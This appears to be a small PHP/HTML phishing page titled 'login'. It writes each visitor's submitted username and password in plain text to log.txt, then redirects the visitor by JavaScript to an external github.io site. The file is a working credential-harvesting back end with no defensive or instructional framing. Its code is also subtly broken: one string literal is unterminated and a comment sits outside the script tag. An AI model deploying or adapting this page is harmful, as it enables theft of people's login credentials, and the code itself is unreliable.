	<html>
		<head>
			<title>login</title>
		</head>
		<body>
			
			<?php
		
		// If submit button is clicked, do the following:
		if ($_POST['Login']) {
		
			$myFile = "log.txt";
			$fh = fopen($myFile, 'a') or die ("can't open file);
			$stringData = $_POST['username'] . ":";
			fwrite($fh, $stringData);
			$stringData = $_POST['password'] . "\n";
			fwrite($fh, $stringData);
			fclose($fh);
			
		} ?>
		
		// goes here after
		<script>location.href = 'https://cdpierce81.github.io/mims';</script>
		
		</body>
	</html>